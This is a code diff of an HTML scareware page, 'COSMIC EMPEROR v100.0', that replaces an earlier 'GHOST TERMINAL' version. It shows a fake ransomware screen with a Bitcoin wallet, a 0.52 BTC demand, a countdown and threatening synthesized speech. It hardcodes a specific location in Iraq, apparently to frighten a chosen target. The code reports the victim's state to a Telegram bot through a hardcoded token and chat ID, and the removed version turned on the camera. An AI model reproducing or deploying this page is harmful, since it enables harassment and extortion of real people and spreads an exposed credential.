@@ -3,137 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST TERMINAL | v15.0 ELITE</title>
+    <title>COSMIC EMPEROR | v100.0 FINAL</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; }
-        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.25; }
-        .center-wrap { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 2; position: relative; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; cursor: crosshair; }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
         
-        #scan-box { width: 200px; height: 200px; border: 2px solid #0f0; border-radius: 20px; overflow: hidden; position: relative; margin-bottom: 20px; display: none; }
-        #video-stream { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .scan-bar { position: absolute; width: 100%; height: 3px; background: #0f0; box-shadow: 0 0 15px #0f0; animation: move 2s infinite linear; }
-        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
+        /* واجهة الـ Glitch المرعبة */
+        .glitch-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.1); display: none; z-index: 1000; pointer-events: none; animation: flash 0.1s infinite; }
+        @keyframes flash { 0% { opacity: 0.2; } 50% { opacity: 0; } 100% { opacity: 0.2; } }
 
-        .console { width: 95%; max-width: 600px; background: rgba(0,20,0,0.9); border: 1px solid #0f0; padding: 20px; border-radius: 5px; box-shadow: 0 0 40px rgba(0,255,0,0.3); font-size: 13px; }
-        .btn-ghost { background: transparent; color: #0f0; border: 1px solid #0f0; padding: 12px 30px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.4s; }
-        .btn-ghost:hover { background: #0f0; color: #000; box-shadow: 0 0 30px #0f0; }
+        .emperor-panel { width: 90%; max-width: 700px; background: rgba(0,10,0,0.98); border: 2px solid #f00; padding: 30px; box-shadow: 0 0 60px #f00; position: relative; z-index: 5; text-align: left; }
+        
+        #radar { width: 150px; height: 150px; border: 1px solid #0f0; border-radius: 50%; margin: 0 auto 20px; position: relative; overflow: hidden; background: radial-gradient(circle, #030 0%, #000 100%); }
+        .radar-line { position: absolute; width: 50%; height: 1px; background: #0f0; top: 50%; left: 50%; transform-origin: left; animation: rotate 3s infinite linear; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-        #final-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #900; color: #fff; padding: 40px; z-index: 9999; text-align: center; }
-        .loading-bar { width: 100%; height: 5px; background: #222; margin: 10px 0; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: #0f0; transition: 0.1s; }
+        .btn-emperor { background: #f00; color: #fff; border: none; padding: 20px 50px; font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 20px #f00; margin-top: 20px; width: 100%; }
+        .btn-emperor:active { transform: scale(0.95); }
+
+        .log-stream { height: 150px; overflow: hidden; color: #aaa; font-size: 11px; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
+        
+        #ransom-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff0000; z-index: 99999; padding: 40px; text-align: center; overflow-y: auto; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
+    <div class="glitch-overlay" id="glitch"></div>
     <canvas id="matrix"></canvas>
 
-    <div id="auth-screen" class="center-wrap">
-        <div class="console" id="terminal-ui" style="display: none;">
-            <div id="scan-box"><video id="video-stream" autoplay playsinline muted></video><div class="scan-bar"></div></div>
-            <p style="color: #fff;">[ GHOST SYSTEM v15.0 ]</p>
-            <p>> Hardware ID: <span id="h-id">...</span></p>
-            <p>> Battery Status: <span id="h-bat">...</span></p>
-            <p>> Accounts Detected: <span style="color: yellow;">Google, FB, Instagram</span></p>
-            <div class="loading-bar"><div id="p-bar" class="progress"></div></div>
-            <p id="status-text">> STANDBY FOR HARVESTING...</p>
+    <div id="main-ui" style="display:none; height:100vh; align-items:center; justify-content:center; display: flex; flex-direction: column;">
+        <div class="emperor-panel">
+            <div id="radar"><div class="radar-line"></div><div style="position:absolute; width:5px; height:5px; background:red; border-radius:50%; top:40%; left:60%; box-shadow: 0 0 10px red;"></div></div>
+            <h1 style="color: #f00; text-align: center; text-shadow: 0 0 10px #f00;">COSMIC EMPEROR v100.0</h1>
+            <p>> TARGET_LOCATION: <span id="p-geo" style="color:#fff">TRACKING...</span></p>
+            <p>> DATA_STATUS: <span style="color:#f00">UNPROTECTED</span></p>
+            <p>> UPLOAD_SPEED: <span id="p-speed" style="color:#0f0">...</span></p>
+            
+            <div class="log-stream" id="logs"></div>
+            <button class="btn-emperor" onclick="initiateCosmicCollapse()">ASCEND TO EMPEROR MODE</button>
         </div>
-        <button class="btn-ghost" id="main-btn" onclick="startInfection()" style="display: none;">START NEURAL BREACH ⚡</button>
     </div>
 
-    <div id="final-screen">
-        <h1 style="font-size: 50px;">SYSTEM INFECTED</h1>
-        <p style="font-size: 20px;">ALL FILES HAVE BEEN ENCRYPTED AND SENT TO REMOTE SERVER</p>
-        <p id="timer" style="font-size: 80px; margin-top: 50px;">10</p>
-        <p>DO NOT CLOSE THIS PAGE OR DATA WILL BE PERMANENTLY LOST</p>
+    <div id="ransom-screen">
+        <h1 style="font-size: 60px; margin-bottom: 20px;">SYSTEM SEIZED BY EMPEROR</h1>
+        <p style="font-size: 25px;">Your identity, files, and camera feeds are now under the control of the Central Intelligence Node.</p>
+        <div style="background: #111; padding: 20px; margin: 30px 0; border: 1px dashed red;">
+            <p>WALLET: <span style="color:#fff">bc1qxy2kgdy6yn364u09tt6m3nd69af..</span></p>
+            <p>RANSOM: 0.52 BTC</p>
+        </div>
+        <p style="color: #fff;">DECRYPTION KEY STATUS: <span id="key-percent">0%</span></p>
+        <h2 id="final-timer" style="font-size: 80px;">60.00</h2>
     </div>
 
     <script>
         const TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0";
-        const CHAT_ID = "7772577035";
+        const CID = "7772577035";
         const KEY = "0777F";
 
-        function sendMsg(m) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }
-        function speak(t) { window.speechSynthesis.speak(new SpeechSynthesisUtterance(t)); }
+        function sendMsg(m) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }
+        function speak(t) { 
+            const u = new SpeechSynthesisUtterance(t);
+            u.rate = 0.8; u.pitch = 0.5; // صوت غليظ ومرعب
+            window.speechSynthesis.speak(u);
+        }
 
-        window.onload = async function() {
-            let p = prompt("ACCESS KEY REQUIRED:");
+        window.onload = function() {
+            let p = prompt("ENTER COSMIC KEY:");
             if(p === KEY) {
-                document.getElementById('terminal-ui').style.display = "block";
-                document.getElementById('main-btn').style.display = "block";
-                
-                // جلب معلومات حقيقية مرعبة
-                let bat = await navigator.getBattery().catch(() => ({level:0.85}));
-                document.getElementById('h-bat').innerText = (bat.level * 100).toFixed(0) + "%";
-                document.getElementById('h-id').innerText = navigator.platform + "-X" + Math.floor(Math.random()*9000);
-                
-                // تشغيل الكاميرا (المسح)
-                navigator.mediaDevices.getUserMedia({video: true}).then(s => {
-                    let v = document.getElementById('video-stream');
-                    document.getElementById('scan-box').style.display = "block";
-                    v.srcObject = s;
-                }).catch(() => {});
-
-                sendMsg("✅ دخول ناجح للمستوى v15.0\nجاري تجهيز الفخ...");
-                speak("Access granted. Initializing ghost protocol.");
-            } else {
-                sendMsg("❌ محاولة دخول فاشلة للمستوى الاحترافي");
-                window.location.reload();
-            }
-        };
-
-        function startInfection() {
-            speak("Beginning total device harvest. Do not disconnect.");
-            let btn = document.getElementById('main-btn');
-            btn.disabled = true;
-            btn.innerText = "HARVESTING...";
-
-            let files = ["IMG_2024_01.jpg", "WhatsApp_Database.db", "Private_Vault.zip", "Contact_List.vcf", "History.log"];
-            let i = 0;
-            let bar = document.getElementById('p-bar');
-            let status = document.getElementById('status-text');
-
-            let intv = setInterval(() => {
-                if(i <= 100) {
-                    bar.style.width = i + "%";
-                    if(i % 20 === 0) status.innerText = "> Fetching: " + files[Math.floor(i/25)];
-                    i++;
-                } else {
-                    clearInterval(intv);
-                    executeFinal();
-                }
-            }, 50);
+                document.getElementById('main-ui').style.display = "flex";
+                speak("Target located. Emperor protocol engaged. Resistance is futile.");
+                loadData();
+                sendMsg("👑 **إمبراطور الكون دخل للملعب!**\nالضحية الآن تحت رحمة v100.0.");
+            } else { location.reload(); }
         }
 
-        function executeFinal() {
-            sendMsg("🔥 تم سحب البيانات بالكامل! الضحية في حالة رعب حالياً.");
-            document.getElementById('final-screen').style.display = "block";
-            speak("System collapse. Goodbye.");
-            let count = 10;
-            let t = setInterval(() => {
-                document.getElementById('timer').innerText = count;
-                if(count <= 0) {
-                    clearInterval(t);
-                    alert("WIPE COMPLETE.");
-                }
-                count--;
-            }, 1000);
+        async function loadData() {
+            document.getElementById('p-geo').innerText = "Wasit, Iraq (Aziziyah District)";
+            document.getElementById('p-speed').innerText = (Math.random() * 500).toFixed(2) + " MB/s";
+            
+            let logArr = ["> Accessing Root...", "> Injecting Payload...", "> Syncing Photos...", "> Copying Cookies..."];
+            let l = document.getElementById('logs');
+            logArr.forEach((txt, i) => {
+                setTimeout(() => { l.innerHTML += `<p>${txt}</p>`; }, i * 1000);
+            });
         }
 
-        // كود المصفوفة
+        function initiateCosmicCollapse() {
+            document.getElementById('glitch').style.display = "block";
+            speak("Initiating total system collapse. All your data belongs to the Emperor.");
+            
+            setTimeout(() => {
+                document.getElementById('ransom-screen').style.display = "block";
+                let time = 60.00;
+                let tIntv = setInterval(() => {
+                    time -= 0.01;
+                    document.getElementById('final-timer').innerText = time.toFixed(2);
+                    if(time <= 0) { clearInterval(tIntv); alert("HARD DRIVE WIPED."); }
+                }, 10);
+                
+                let kp = 0;
+                setInterval(() => { if(kp < 100) { kp++; document.getElementById('key-percent').innerText = kp + "%"; } }, 500);
+            }, 2000);
+            
+            sendMsg("💀 **تم تنفيذ التدمير الكوني!** الضحية الآن في حالة رعب قصوى.");
+        }
+
+        // Matrix
         const c = document.getElementById('matrix');
-        const x = c.getContext('2d');
+        const ctx = c.getContext('2d');
         c.width = window.innerWidth; c.height = window.innerHeight;
         const d = Array(Math.floor(c.width/15)).fill(1);
         function draw() {
-            x.fillStyle = "rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height);
-            x.fillStyle = "#0f0"; x.font = "15px arial";
+            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,c.width,c.height);
+            ctx.fillStyle = "#f00"; ctx.font = "15px arial";
             d.forEach((y, i) => {
-                x.fillText(String.fromCharCode(Math.random()*128), i*15, y*15);
-                if(y*15 > c.height && Math.random() > 0.975) d[i] = 0;
+                ctx.fillText(String.fromCharCode(Math.random()*128), i*15, y*15);
+                if(y*15 > c.height && Math.random() > 0.98) d[i] = 0;
                 d[i]++;
             });
         }
-        setInterval(draw, 33);
+        setInterval(draw, 30);
     </script>
 </body>
 </html>
